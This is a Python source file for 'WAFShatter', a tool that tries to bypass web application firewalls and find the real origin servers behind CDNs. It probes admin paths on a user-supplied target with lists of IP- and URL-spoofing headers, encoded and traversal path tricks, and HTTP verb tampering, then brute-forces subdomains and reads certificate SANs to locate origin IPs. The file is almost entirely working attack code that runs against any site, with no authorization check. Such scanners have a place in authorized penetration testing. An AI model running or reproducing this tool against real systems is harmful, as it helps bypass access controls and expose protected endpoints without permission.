#!/usr/bin/env python3
import asyncio
import aiohttp
import hashlib
import json
import re
import ssl
import struct
import socket
from urllib.parse import urlparse
from pathlib import Path
from smart_filter import REQUEST_DELAY, confidence_score, confidence_label, severity_from_confidence

# ── 57 BYPASS HEADERS ─────────────────────────────────────────────────────────
BYPASS_HEADERS = [
    # IP spoofing — loopback variants
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1, 127.0.0.1"},
    {"X-Forwarded-For": "0.0.0.0"},
    {"X-Forwarded-For": "::1"},
    {"X-Forwarded-For": "2130706433"},            # 127.0.0.1 decimal
    {"X-Forwarded-For": "0x7f000001"},            # 127.0.0.1 hex
    {"X-Forwarded-For": "127.0.0.1%00"},          # null-byte suffix
    {"X-Forwarded-For": " 127.0.0.1"},            # leading space
    {"X-Forwarded-For": "127.0.0.1, 10.0.0.1"},  # trusted + internal
    # IP spoofing — other headers
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"X-Cluster-Client-IP": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"Forwarded": "for=127.0.0.1;by=127.0.0.1;host=localhost"},
    {"Forwarded": "for=\"[::1]\""},
    # Host / routing override
    {"X-Host": "localhost"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Forwarded-Server": "localhost"},
    {"X-Backend": "localhost"},
    {"Via": "1.1 localhost"},
    {"X-ProxyPass-To": "http://localhost"},
    {"X-Forwarded-Port": "443"},
    {"X-Forwarded-Proto": "https"},
    # URL / path override
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Override-URL": "/admin"},
    {"X-Originating-URL": "/admin"},
    {"X-Request-URI": "/admin"},
    # HTTP method override
    {"X-HTTP-Method-Override": "PUT"},
    {"X-Method-Override": "PUT"},
    {"X-HTTP-Method": "PUT"},
    {"_method": "PUT"},
    # Internal / trusted network signals
    {"X-Internal-Request": "true"},
    {"X-Trusted-Proxy": "true"},
    {"X-From-Trusted-Network": "1"},
    {"X-Secure": "1"},
    {"X-Auth-Internal": "true"},
    # WAF evasion via Accept / Content-Type
    {"Accept": "application/json, text/html;q=0.9, */*;q=0.1"},
    {"Content-Type": "application/json; charset=utf-8"},
    {"Content-Type": "application/x-www-form-urlencoded"},
    # Miscellaneous bypass signals
    {"X-Azure-FDID": "00000000-0000-0000-0000-000000000000"},
    {"X-Akamai-Security-Token": "bypass"},
    {"X-Debug": "1"},
    {"X-Admin": "1"},
    {"X-Privileged-Access": "1"},
    {"X-Bypass": "true"},
    {"X-WAF-Bypass": "1"},
    {"X-Security-Token": "internal"},
    {"CF-Worker": "bypass"},
    {"X-Shopify-Access-Token": "bypass"},
]

# ── 43 PATH TRICKS ─────────────────────────────────────────────────────────────
PATH_TRICKS = [
    # Trailing characters
    "/admin", "/admin/", "/admin/.", "/admin//", "/admin//./",
    "/admin.", "/admin.html", "/admin.json", "/admin.php", "/admin.asp",
    # Whitespace / control chars
    "/admin%20", "/admin%09", "/admin%0a", "/admin%0d", "/admin%0b",
    # URL encoding
    "/%61dmin",             # 'a' encoded
    "/%61%64%6d%69%6e",    # fully encoded 'admin'
    "/%2fadmin",
    "/admin%2f",
    "/%2e/admin",
    "/admin%2e",
    "/admin%252f",          # double-encoded slash
    "/admin%c0%af",         # overlong UTF-8 slash
    "/admin%ef%bc%8f",      # full-width slash
    "/admin%00",
    "/admin%00.html",
    # Path traversal
    "/admin/..;/", "/admin..;/", "/.;/admin",
    "/admin/%2e%2e",
    "/admin/../admin",
    "/./admin",
    "/admin/./",
    # Multi-slash
    "//admin", "//admin//", "/./admin/./",
    # Case manipulation
    "/Admin", "/ADMIN", "/aDmIn", "/AdMiN",
    # Fragment / query tricks
    "/admin?", "/admin#", "/admin?x=1", "/admin?debug=true",
    # Semicolon / extension tricks
    "/admin;/", "/admin;.js", "/admin;index",
    # Spring Boot / Java tricks
    "/admin/..%3B/",        # %3B = semicolon
    "/admin/.%3B/",
]

PROTECTED_PATHS = ["/admin", "/api/admin", "/dashboard", "/internal", "/api/internal", "/manage"]

ORIGIN_SUBS = [
    'origin', 'direct', 'backend', 'source', 'www2', 'dev', 'staging',
    'old', 'origin1', 'origin2', 'real', 'internal', 'api-direct',
    'origin-www', 'direct-api', 'backend-api', 'prod', 'production',
    'server', 'api', 'app', 'web', 'www', 'edge', 'cdn', 'proxy',
    'lb', 'loadbalancer', 'upstream', 'primary', 'master', 'main',
]

WAF_SIGNATURES = {
    'Cloudflare':  lambda h, b: bool(h.get('CF-RAY') or 'cloudflare' in h.get('Server', '').lower() or 'cloudflare' in b[:2000].lower()),
    'Akamai':      lambda h, b: bool(h.get('X-Akamai-Transformed') or 'akamai' in h.get('Server', '').lower()),
    'AWS':         lambda h, b: bool('awselb' in h.get('Server', '').lower() or 'cloudfront' in h.get('Via', '').lower()),
    'Sucuri':      lambda h, b: bool('sucuri' in h.get('Server', '').lower() or 'sucuri' in b[:2000].lower()),
    'Imperva':     lambda h, b: bool('imperva' in h.get('Server', '').lower() or 'incapsula' in h.get('Server', '').lower()),
    'F5':          lambda h, b: bool('f5' in h.get('Server', '').lower() or 'big-ip' in h.get('Server', '').lower()),
    'Barracuda':   lambda h, b: bool('barracuda' in h.get('Server', '').lower()),
    'Fortinet':    lambda h, b: bool('fortinet' in h.get('Server', '').lower() or 'fortigate' in b[:2000].lower()),
    'ModSecurity': lambda h, b: bool('mod_security' in b[:2000].lower() or h.get('X-Mod-Security')),
    'Nginx WAF':   lambda h, b: bool('nginx' in h.get('Server', '').lower() and 'forbidden' in b[:500].lower()),
    'Wordfence':   lambda h, b: bool('wordfence' in b[:2000].lower()),
}


class WAFShatter:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.host = urlparse(target).hostname
        self.scheme = urlparse(target).scheme
        self.findings = []
        self._seen_bypass_hashes = set()

    async def probe(self, sess, url, headers=None, method='GET'):
        try:
            timeout = aiohttp.ClientTimeout(total=10)
            req = getattr(sess, method.lower())
            async with req(
                url, headers=headers or {}, ssl=False,
                timeout=timeout, allow_redirects=False
            ) as r:
                body = await r.text(errors='ignore')
                return {
                    'url': url,
                    'status': r.status,
                    'len': len(body),
                    'hash': hashlib.md5(body.encode(errors='ignore')).hexdigest()[:10],
                    'server': r.headers.get('Server', ''),
                    'location': r.headers.get('Location', ''),
                    'all_headers': dict(r.headers),
                    'body_snippet': body[:300],
                }
        except Exception as e:
            return {'error': str(e)[:80]}

    def detect_waf(self, response):
        headers = response.get('all_headers', {})
        body = response.get('body_snippet', '')
        detected = []
        for name, check in WAF_SIGNATURES.items():
            try:
                if check(headers, body):
                    detected.append(name)
            except Exception:
                pass
        return detected or ['Unknown/None']

    def is_real_bypass(self, r, base_status, base_hash):
        return (
            r.get('status') == 200
            and base_status in (401, 403, 404)
            and r.get('len', 0) > 200
            and r.get('hash') != base_hash
            and r.get('hash') not in self._seen_bypass_hashes
        )

    async def find_origin(self):
        print("[*] Origin discovery — DNS enumeration + direct IP probing")
        import socket as _socket
        loop = asyncio.get_event_loop()
        candidates = []

        # 1. Subdomain DNS brute-force
        dns_tasks = []
        for sub in ORIGIN_SUBS:
            hostname = f"{sub}.{self.host}"
            dns_tasks.append((hostname, loop.run_in_executor(None, _socket.gethostbyname, hostname)))

        for hostname, coro in dns_tasks:
            try:
                ip = await asyncio.wait_for(coro, timeout=3.0)
                # Skip if same as CDN IP (resolve main domain and compare)
                candidates.append({'method': 'dns', 'host': hostname, 'ip': ip})
                print(f"  [DNS] {hostname} -> {ip}")
            except Exception:
                pass

        # 2. Try direct HTTP to discovered IPs with Host header spoofed
        conn = aiohttp.TCPConnector(limit=10, ssl=False)
        async with aiohttp.ClientSession(connector=conn) as sess:
            seen_ips = set()
            for c in candidates:
                ip = c['ip']
                if ip in seen_ips:
                    continue
                seen_ips.add(ip)
                direct_url = f"{self.scheme}://{ip}/"
                try:
                    timeout = aiohttp.ClientTimeout(total=5)
                    async with sess.get(
                        direct_url,
                        headers={'Host': self.host, 'User-Agent': 'Mozilla/5.0'},
                        ssl=False, timeout=timeout, allow_redirects=False
                    ) as r:
                        body = await r.text(errors='ignore')
                        c['direct_status'] = r.status
                        c['direct_len'] = len(body)
                        if r.status in (200, 301, 302, 403):
                            print(f"  [ORIGIN] Direct IP {ip} responds: HTTP {r.status} ({len(body)}b)")
                            c['verified'] = True
                        await asyncio.sleep(0.2)
                except Exception:
                    c['verified'] = False

        # 3. SSL certificate SAN lookup for origin hints
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_OPTIONAL
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.host, 443, ssl=ctx), timeout=5
            )
            cert = writer.get_extra_info('ssl_object').getpeercert()
            writer.close()
            sans = []
            for rdn in cert.get('subjectAltName', []):
                if rdn[0] == 'DNS':
                    sans.append(rdn[1])
            if sans:
                print(f"  [CERT] SAN entries: {sans[:10]}")
                for san in sans:
                    if san.startswith('*.'):
                        san = san[2:]
                    if san != self.host and not san.startswith('*.'):
                        try:
                            ip = await loop.run_in_executor(None, _socket.gethostbyname, san)
                            candidates.append({'method': 'cert_san', 'host': san, 'ip': ip})
                            print(f"  [CERT] SAN {san} -> {ip}")
                        except Exception:
                            pass
        except Exception:
            pass

        return candidates

    async def test_verb_tampering(self, sess, url, base_status, base_hash):
        print(f"\n[*] HTTP verb tampering: {url}")
        verbs = ['HEAD', 'OPTIONS', 'TRACE', 'PUT', 'PATCH', 'DELETE', 'CONNECT', 'PROPFIND', 'MOVE']
        for verb in verbs:
            r = await self.probe(sess, url, method=verb)
            await asyncio.sleep(REQUEST_DELAY)
            if 'error' in r:
                continue
            if r['status'] == 200 and base_status in (401, 403) and r['len'] > 50:
                self.findings.append({
                    'type': 'verb_bypass',
                    'verb': verb,
                    'url': url,
                    'severity': 'HIGH',
                    'confidence': 80,
                    'confidence_label': 'High',
                    'proof': f'HTTP {verb} returned 200 when GET returned {base_status}',
                    'remediation': 'Apply authorization checks per HTTP method',
                })
                print(f"  [BYPASS] {verb} {url} -> 200 (was {base_status})")

    async def run(self):
        conn = aiohttp.TCPConnector(limit=15, ssl=False)
        async with aiohttp.ClientSession(
            connector=conn,
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        ) as sess:
            # Baseline
            print("[*] Fetching baselines...")
            baselines = {}
            for path in PROTECTED_PATHS[:3]:
                r = await self.probe(sess, self.target + path)
                if 'error' not in r:
                    baselines[path] = r
                    print(f"  {path}: status={r['status']} len={r['len']}")

            if not baselines:
                print("[!] All baseline paths errored — target may be unreachable")
                return self.findings

            # Use /admin as primary baseline
            primary_path = '/admin'
            base = baselines.get(primary_path, list(baselines.values())[0])
            base_status = base.get('status')
            base_hash = base.get('hash')
            base_len = base.get('len', 0)

            # WAF detection (improved multi-signature)
            wafs = self.detect_waf(base)
            print(f"[+] Baseline: status={base_status} len={base_len}")
            print(f"[+] WAF detected: {', '.join(wafs)}")

            # Header bypass (57 headers)
            print(f"\n[*] Testing {len(BYPASS_HEADERS)} header bypass vectors...")
            for hdr in BYPASS_HEADERS:
                r = await self.probe(sess, self.target + primary_path, headers=hdr)
                await asyncio.sleep(REQUEST_DELAY)
                if 'error' in r:
                    continue
                if self.is_real_bypass(r, base_status, base_hash):
                    self._seen_bypass_hashes.add(r['hash'])
                    k, v = list(hdr.items())[0]
                    conf = confidence_score({
                        'was_blocked': (base_status in (401, 403), 50),
                        'now_200': (True, 40),
                        'has_content': (r['len'] > 500, 10),
                    })
                    print(f"  [BYPASS] {k}: {v} -> {base_status} became 200 ({r['len']}b) [confidence: {confidence_label(conf)}]")
                    self.findings.append({
                        'type': 'header_bypass',
                        'header': hdr,
                        'waf': wafs,
                        'severity': severity_from_confidence('HIGH', conf),
                        'confidence': conf,
                        'confidence_label': confidence_label(conf),
                        'proof': f'Header {k}:{v} changed status from {base_status} to 200 with {r["len"]}b',
                        'remediation': 'Do not trust IP/host spoofing headers for access control decisions',
                        **{ik: iv for ik, iv in r.items() if ik not in ('body_snippet', 'all_headers')},
                    })

            # Path tricks (43 paths)
            print(f"\n[*] Testing {len(PATH_TRICKS)} path manipulation vectors...")
            for path in PATH_TRICKS:
                r = await self.probe(sess, self.target + path)
                await asyncio.sleep(REQUEST_DELAY)
                if 'error' in r:
                    continue
                if self.is_real_bypass(r, base_status, base_hash):
                    self._seen_bypass_hashes.add(r['hash'])
                    conf = confidence_score({
                        'was_blocked': (base_status in (401, 403), 50),
                        'now_200': (True, 40),
                        'different_content': (True, 10),
                    })
                    print(f"  [BYPASS] Path {path} -> 200 ({r['len']}b) [confidence: {confidence_label(conf)}]")
                    self.findings.append({
                        'type': 'path_bypass',
                        'path': path,
                        'waf': wafs,
                        'severity': severity_from_confidence('HIGH', conf),
                        'confidence': conf,
                        'confidence_label': confidence_label(conf),
                        'proof': f'Path trick returned 200 ({r["len"]}b) vs baseline {base_status}',
                        'remediation': 'Normalize URL paths before applying access control rules',
                        **{ik: iv for ik, iv in r.items() if ik not in ('body_snippet', 'all_headers')},
                    })

            # HTTP verb tampering per protected path
            print(f"\n[*] HTTP verb tampering tests...")
            for path, b in baselines.items():
                await self.test_verb_tampering(sess, self.target + path, b.get('status'), b.get('hash'))

        # Origin discovery (DNS + direct IP + SSL SAN) — outside session so it can open new connections
        print(f"\n[*] Origin discovery...")
        origins = await self.find_origin()
        for o in origins:
            severity = 'HIGH' if o.get('verified') else 'LOW'
            conf = 80 if o.get('verified') else 40
            self.findings.append({
                'type': 'possible_origin_ip',
                'severity': severity,
                'confidence': conf,
                'confidence_label': confidence_label(conf),
                'method': o.get('method'),
                'host': o.get('host'),
                'ip': o.get('ip'),
                'direct_status': o.get('direct_status'),
                'verified': o.get('verified', False),
                'detail': f"Origin candidate {o['host']} -> {o['ip']}" + (" (verified: responds to direct HTTP)" if o.get('verified') else ""),
                'remediation': 'Restrict direct IP access; whitelist only WAF/CDN IPs at origin firewall',
            })

        return self.findings


def get_target():
    p = Path("reports/_target.txt")
    if p.exists():
        return p.read_text().strip()
    u = input("[?] Target URL: ").strip()
    return u if u.startswith("http") else "https://" + u


def main():
    print("=" * 60)
    print("  WAFShatter — WAF Bypass & Origin Discovery")
    print("=" * 60)
    target = get_target()
    print(f"[+] Target: {target}")
    Path("reports").mkdir(exist_ok=True)
    findings = asyncio.run(WAFShatter(target).run())
    with open("reports/wafshatter.json", 'w') as f:
        json.dump(findings, f, indent=2, default=str)
    print(f"\n[+] {len(findings)} findings -> reports/wafshatter.json")

    bypasses = [f for f in findings if f.get('type') in ('header_bypass', 'path_bypass', 'verb_bypass')]
    origins = [f for f in findings if f.get('type') == 'possible_origin_ip']

    if bypasses:
        print(f"\n[!] {len(bypasses)} confirmed WAF bypass(es):")
        for b in bypasses:
            label = b.get('path') or b.get('header') or b.get('verb', '?')
            print(f"    [{b['type']}] {label} [confidence: {b.get('confidence_label')}]")

    verified_origins = [o for o in origins if o.get('verified')]
    if verified_origins:
        print(f"\n[!] {len(verified_origins)} verified origin IP(s):")
        for o in verified_origins:
            print(f"    {o['host']} -> {o['ip']} (HTTP {o.get('direct_status')})")


if __name__ == '__main__':
    main()
